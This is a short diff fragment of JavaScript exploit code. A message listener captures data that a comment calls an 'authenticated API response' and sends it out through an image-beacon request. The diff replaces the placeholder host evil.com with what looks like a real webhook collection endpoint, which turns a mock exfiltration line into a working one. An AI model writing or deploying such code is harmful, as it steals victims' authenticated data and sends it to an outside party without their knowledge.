@@ -19,7 +19,7 @@
     }, 3000);
     window.addEventListener("message", function(e) {
       // Exfiltrate authenticated API response
-      new Image().src = "https://evil.com/exfil?" + encodeURIComponent(
+      new Image().src = "https://jolly-meteor-33.webhook.cool/exfil?" + encodeURIComponent(
         typeof e.data === "string" ? e.data : JSON.stringify(e.data)
       );
     });
